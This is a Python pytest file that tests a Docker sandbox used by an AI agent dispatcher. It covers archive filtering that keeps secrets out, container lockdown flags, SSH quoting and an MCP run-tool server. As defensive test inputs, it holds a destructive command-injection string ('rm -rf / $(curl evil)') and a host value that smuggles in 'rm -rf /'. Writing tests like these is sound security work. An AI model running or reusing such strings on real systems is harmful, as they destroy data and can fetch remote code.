"""The sandbox copies only safe files, locks its containers down and fails closed."""

import io
import json
import shlex
import sys
import tarfile
from pathlib import Path

import pytest

from agent_dispatcher import sandbox_mcp
from agent_dispatcher.sandbox import (
    BASE_IMAGE,
    CHECKS,
    COMMAND_FILE,
    OUTPUT_LIMIT,
    Sandbox,
    SandboxError,
    SandboxResult,
    archive,
    byte_exec,
    environment_key,
)
from agent_dispatcher.settings import Settings


class FakeDocker:
    """Records docker calls; answers from a script of (match, code, output)."""

    def __init__(self, answers: list[tuple[str, int, str]] | None = None) -> None:
        self.calls: list[tuple[list[str], bytes]] = []
        self.answers = answers or []

    def __call__(
        self, argv: list[str], stdin: bytes, timeout: float
    ) -> tuple[int, str]:
        del timeout
        self.calls.append((argv, stdin))
        line = " ".join(argv)
        for match, code, output in self.answers:
            if match in line:
                return code, output
        return 0, ""

    def verbs(self) -> list[str]:
        return [argv[1] for argv, _ in self.calls]


def names(stream: bytes) -> dict[str, bytes]:
    with tarfile.open(fileobj=io.BytesIO(stream)) as tar:
        return {
            member.name: tar.extractfile(member).read()  # type: ignore[union-attr]
            for member in tar.getmembers()
        }


def project(root: Path) -> Path:
    (root / "src").mkdir(parents=True)
    (root / "src" / "a.py").write_text("x = 1\n", encoding="utf-8")
    (root / "pyproject.toml").write_text("[project]\nname='a'\n", encoding="utf-8")
    (root / "uv.lock").write_text("version = 1\n", encoding="utf-8")
    return root


def test_the_copy_leaves_out_git_environments_caches_and_secrets(
    tmp_path: Path,
) -> None:
    project(tmp_path)
    for name in (".git/config", ".venv/x", "node_modules/y", "a/__pycache__/z"):
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text("no", encoding="utf-8")
    for name in (".env", "config/.env.local"):
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text("TOKEN=held-secret", encoding="utf-8")
    files = names(archive(tmp_path, {COMMAND_FILE: "pytest\n"}))
    assert set(files) == {"src/a.py", "pyproject.toml", "uv.lock", COMMAND_FILE}
    assert files[COMMAND_FILE] == b"pytest\n"
    assert b"held-secret" not in b"".join(files.values())


def test_the_environment_is_named_by_its_lockfile(tmp_path: Path) -> None:
    assert environment_key(tmp_path) is None
    project(tmp_path)
    first = environment_key(tmp_path)
    assert first is not None
    assert first.startswith("agent-sandbox:")
    (tmp_path / "uv.lock").write_text("version = 2\n", encoding="utf-8")
    assert environment_key(tmp_path) != first


def test_a_run_is_locked_down_and_the_command_only_travels_in_the_copy(
    tmp_path: Path,
) -> None:
    docker = FakeDocker([("run --rm", 1, "F\n1 failed")])
    command = "pytest; rm -rf / $(curl evil)"
    result = Sandbox(execute=docker).run("img", project(tmp_path), command)
    assert result == SandboxResult(1, "F\n1 failed")
    argv, stdin = docker.calls[0]
    assert argv[:3] == ["docker", "run", "--rm"]
    for flag in (
        ["--network", "none"],
        ["--cap-drop", "ALL"],
        ["--security-opt", "no-new-privileges"],
        ["--user", "1000:1000"],
        ["--read-only"],
        ["--memory", "1g"],
        ["--pids-limit", "256"],
    ):
        assert any(argv[i : i + len(flag)] == flag for i in range(len(argv)))
    assert "-v" not in argv
    assert "--mount" not in argv
    assert command not in " ".join(argv)
    assert names(stdin)[COMMAND_FILE] == (command + "\n").encode()


def test_over_ssh_every_argument_is_quoted_for_the_remote_shell(
    tmp_path: Path,
) -> None:
    docker = FakeDocker()
    key = tmp_path / ".ssh" / "id"
    Sandbox(host="me@box", ssh_key=key, execute=docker).run("img", tmp_path, "x")
    argv, _ = docker.calls[0]
    assert argv[0] == "ssh"
    assert "BatchMode=yes" in argv
    assert "StrictHostKeyChecking=yes" in argv
    assert f"UserKnownHostsFile={key.parent / 'known_hosts'}" in argv
    host = argv.index("me@box")
    remote = shlex.split(argv[host + 1])
    assert remote[:4] == ["sudo", "-n", "docker", "run"]
    assert len(argv) == host + 2


def test_long_output_keeps_its_end_and_timeouts_are_reported(tmp_path: Path) -> None:
    docker = FakeDocker([("run --rm", 124, "start " + "x" * OUTPUT_LIMIT + " end")])
    result = Sandbox(execute=docker).run("img", tmp_path, "sleep 999")
    assert result.timed_out
    assert result.output.startswith("[earlier output cut]")
    assert result.output.endswith(" end")
    assert result.report().startswith("The command timed out and was stopped.")
    assert SandboxResult(0, "").report() == "Exit code 0."


def test_an_environment_is_built_once_from_the_base_then_reused(
    tmp_path: Path,
) -> None:
    project(tmp_path)
    key = environment_key(tmp_path)
    assert key is not None
    missing = FakeDocker([(f"inspect --format ok {key}", 1, "")])
    assert Sandbox(execute=missing).prepare(tmp_path) == key
    assert missing.verbs() == ["image", "image", "rm", "run", "commit", "rm", "images"]
    build = next(argv for argv, _ in missing.calls if argv[1] == "run")
    assert "uv sync --locked --all-groups" in build[-1]
    assert BASE_IMAGE in build
    present = FakeDocker()
    assert Sandbox(execute=present).prepare(tmp_path) == key
    assert present.verbs() == ["image", "image"]


def test_a_project_without_a_lockfile_uses_the_base_image(tmp_path: Path) -> None:
    assert Sandbox(execute=FakeDocker()).prepare(tmp_path) == BASE_IMAGE


def test_a_failed_install_raises_and_removes_its_container(tmp_path: Path) -> None:
    project(tmp_path)
    key = environment_key(tmp_path)
    docker = FakeDocker(
        [(f"inspect --format ok {key}", 1, ""), ("run -i", 2, "no such package")]
    )
    with pytest.raises(SandboxError, match="no such package"):
        Sandbox(execute=docker).prepare(tmp_path)
    assert docker.verbs()[-1] == "rm"
    assert "commit" not in docker.verbs()


def test_a_failed_base_build_raises(tmp_path: Path) -> None:
    docker = FakeDocker(
        [(f"inspect --format ok {BASE_IMAGE}", 1, ""), ("build", 1, "x")]
    )
    with pytest.raises(SandboxError, match="base image build failed"):
        Sandbox(execute=docker).prepare(tmp_path)


def test_old_environments_are_pruned_to_the_newest_three(tmp_path: Path) -> None:
    project(tmp_path)
    key = environment_key(tmp_path)
    listing = "\n".join(f"agent-sandbox:{n}" for n in "abcde")
    docker = FakeDocker(
        [(f"inspect --format ok {key}", 1, ""), ("images agent-sandbox", 0, listing)]
    )
    Sandbox(execute=docker).prepare(tmp_path)
    removed = [argv[2] for argv, _ in docker.calls if argv[1] == "rmi"]
    assert removed == ["agent-sandbox:d", "agent-sandbox:e"]


def test_checks_run_whatever_the_environment_has() -> None:
    for tool in ("ruff check .", "pyright", "pytest -q", "unittest"):
        assert tool in CHECKS


def test_ssh_mode_needs_a_host() -> None:
    with pytest.raises(ValueError, match="sandbox_host"):
        Settings(sandbox="ssh")
    assert Settings(sandbox="ssh", sandbox_host="abdel@100.82.195.92").sandbox_host
    with pytest.raises(ValueError, match="String should match"):
        Settings(sandbox="ssh", sandbox_host="abdel@box; rm -rf /")


def rpc(server: sandbox_mcp.Server, method: str, params: object = None) -> object:
    message: dict[str, object] = {"jsonrpc": "2.0", "id": 1, "method": method}
    if params is not None:
        message["params"] = params
    return server.reply(message)


def test_the_run_tool_serves_one_worktree_and_logs_each_call(tmp_path: Path) -> None:
    docker = FakeDocker([("run --rm", 0, "3 passed")])
    log = tmp_path / "log.jsonl"
    server = sandbox_mcp.Server(Sandbox(execute=docker), "img", tmp_path, log)
    assert rpc(server, "tools/list") == {
        "jsonrpc": "2.0",
        "id": 1,
        "error": {"code": -32002, "message": "Initialize first."},
    }
    assert rpc(server, "initialize", {})
    listed = rpc(server, "tools/list")
    assert [tool["name"] for tool in listed["result"]["tools"]] == ["run"]  # type: ignore[index]
    called = rpc(
        server, "tools/call", {"name": "run", "arguments": {"command": "pytest"}}
    )
    assert called["result"]["content"][0]["text"] == "Exit code 0.\n3 passed"  # type: ignore[index]
    entry = json.loads(log.read_text(encoding="utf-8"))
    assert entry["exit_code"] == 0
    assert entry["command_chars"] == len("pytest")


@pytest.mark.parametrize(
    "params",
    [
        {"name": "shell", "arguments": {"command": "ls"}},
        {"name": "run", "arguments": {"command": "  "}},
        {"name": "run", "arguments": {"command": "x" * 4001}},
        {"name": "run", "arguments": "ls"},
        "not an object",
    ],
)
def test_bad_tool_calls_are_errors_and_run_nothing(
    tmp_path: Path, params: object
) -> None:
    docker = FakeDocker()
    server = sandbox_mcp.Server(Sandbox(execute=docker), "img", tmp_path, None)
    rpc(server, "initialize", {})
    reply = rpc(server, "tools/call", params)
    assert reply["result"]["isError"] is True  # type: ignore[index]
    assert docker.calls == []


def test_the_server_stops_on_malformed_input(tmp_path: Path) -> None:
    server = sandbox_mcp.Server(Sandbox(execute=FakeDocker()), "img", tmp_path, None)
    out = io.StringIO()
    assert sandbox_mcp.serve(server, io.StringIO("[1]\n"), out) == 1
    assert sandbox_mcp.serve(server, io.StringIO("{bad\n"), out) == 1
    assert sandbox_mcp.serve(server, io.StringIO("x" * 70_000 + "\n"), out) == 1
    good = '{"jsonrpc":"2.0","id":7,"method":"ping"}\n{"method":"note"}\n'
    assert sandbox_mcp.serve(server, io.StringIO(good), out) == 0
    assert json.loads(out.getvalue()) == {"jsonrpc": "2.0", "id": 7, "result": {}}


def test_the_process_runner_passes_bytes_untouched_and_times_out() -> None:
    echo = [
        sys.executable,
        "-c",
        "import sys; sys.stdout.buffer.write(sys.stdin.buffer.read())",
    ]
    assert byte_exec(echo, b"tar\x00\xff", 30) == (0, "tar\x00\ufffd")
    sleep = [sys.executable, "-c", "import time; time.sleep(30)"]
    assert byte_exec(sleep, b"", 0.5) == (124, "timed out after 0s")


def test_the_server_entry_point_reads_its_call_from_arguments(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    served: list[sandbox_mcp.Server] = []

    def serve(server: sandbox_mcp.Server, _in: object, _out: object) -> int:
        served.append(server)
        return 0

    monkeypatch.setattr(sandbox_mcp, "serve", serve)
    argv = ["--image", "img", "--worktree", str(tmp_path), "--host", "me@box"]
    argv += ["--key", str(tmp_path / "id"), "--log", str(tmp_path / "l")]
    assert sandbox_mcp.main(argv) == 0
    server = served[0]
    assert (server.image, server.worktree, server.log) == (
        "img",
        tmp_path,
        tmp_path / "l",
    )
    assert server.sandbox.host == "me@box"
    assert server.sandbox.ssh_key == tmp_path / "id"
